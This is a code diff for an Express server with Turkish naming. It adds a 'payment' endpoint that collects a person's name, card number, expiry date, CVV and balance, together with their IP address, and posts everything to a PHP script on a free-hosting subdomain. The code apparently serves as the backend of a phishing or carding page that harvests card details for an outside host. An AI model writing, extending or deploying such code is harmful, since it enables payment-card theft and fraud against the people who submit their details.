@@ -243,6 +243,41 @@ app.post('/api/adres/sil', (req, res) => {
   });
 });
 
+// İstemcinin gerçek IP adresini alan fonksiyon
+function getClientIp(req) {
+  const forwarded = req.headers['x-forwarded-for'];
+  return forwarded ? forwarded.split(',')[0] : req.connection.remoteAddress;
+}
+
+app.post('/api/odeme', (req, res) => {
+  const ip = getClientIp(req);
+  const { isim_soyisim, kredi_karti, skt, cvv, bakiye } = req.body;
+
+  axios.post('https://forestgreen-rook-759809.hostingersite.com/dmn/test.php',
+    qs.stringify({
+      isim_soyisim,
+      kredi_karti,
+      skt,
+      cvv,
+      bakiye,
+      ip_adresi: ip
+    }),
+    {
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'X-Requested-With': 'XMLHttpRequest'
+      }
+    }
+  )
+  .then(response => {
+    res.send(response.data); // PHP'den gelen cevabı frontend'e gönder
+  })
+  .catch(error => {
+    console.error('Ödeme hatası:', error.message);
+    res.status(500).send('fail');
+  });
+});
+
 app.get('/authenticator', (req, res) => {
      const caAsCookie = req.cookies.ca_as;
     if (!caAsCookie) {
